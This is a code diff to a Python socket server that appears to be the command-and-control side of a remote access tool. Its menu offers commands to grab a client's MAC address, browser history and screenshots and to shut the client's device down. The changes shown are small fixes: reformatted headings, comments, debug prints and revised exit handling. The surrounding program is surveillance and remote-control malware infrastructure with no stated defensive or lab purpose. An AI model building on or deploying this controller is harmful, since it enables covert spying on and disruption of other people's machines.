@@ -70,13 +70,13 @@ ________/\\\\\\\\\________/\\\\\\\\\_____/\\\\\\\\\____
 
         List of commands:
 
-        **** INFORMATION ****
+                INFORMATION
         - help        : GET ALL AVAILABLE COMMANDS
         - mac         : GET MACHINE'S MAC ADDRESS
         - history     : GET BROWSER HISTORY (LAST 20)
         - scrn        : GET SCREENSHOT OF CURRENT SESSION
 
-        **** CONTROL ****
+                CONTROL
         - killc       : DISCONNECT CLIENT
         - quit        : DISCONNECT SERVER
         - shutdown    : SHUTDOWN THE CLIENT'S DEVICE
@@ -185,8 +185,12 @@ ________/\\\\\\\\\________/\\\\\\\\\_____/\\\\\\\\\____
     def handle_client(self, client_id):
         print(f"\n{INFO} Connected to: {client_store[client_id]['address']}")
         while True:
+            # Extract commands and socket for this client instance
             c = client_store[client_id]['commands']
             s = client_store[client_id]['socket']
+            print('rotation')
+            print(c)
+            # Get basic info to fill the client table
             client_store[client_id]['mac'] = s.recv(1024).decode()
             s.send(b'received')
             client_store[client_id]['system'] = s.recv(1024).decode()
@@ -246,11 +250,15 @@ ________/\\\\\\\\\________/\\\\\\\\\_____/\\\\\\\\\____
             server_socket.bind(ADDR)
         except socket.error as err:
             print(f'\n{FAILING}: Socket creation failed: {err}')
-            sys.exit()
+            try:
+                sys.exit(0)
+            except SystemExit:
+                os._exit(0)
         server_socket.listen(20)
         commands_thread = Thread(target=self.execute_commands)
         commands_thread.start()
         while True:
+            # On client connection, initiate socket socket and add to store 
             client_socket, client_address = server_socket.accept()
             client_id = str(len(client_store)+1)
             client_store[client_id] = {
@@ -271,9 +279,16 @@ if __name__ == "__main__":
         server.banner()
         server.main()
     except KeyboardInterrupt:
-        # confirmation = input('Do you wish to terminate the session? [y/n]: ')
-        # selection = True if confirmation in ['y', 'yes'] else False
-        # if selection:
-        server_socket.close()
-        print(f'\n{INFO} Terminating session.')
-        sys.exit(0)
+        # FIXME: fix the interupt process by keyboard
+        print(f"\n{INFO} Keyboard interrupt initiated")
+        confirmation = input('Do you wish to terminate the session? [y/n]: ')
+        selection = True if confirmation in ['y', 'yes'] else False
+        if selection:
+            server_socket.close()
+            print(f'\n{INFO} Terminating session.')
+            try:
+                sys.exit(0)
+            except SystemExit:
+                os._exit(0)
+        else:
+            server.main()
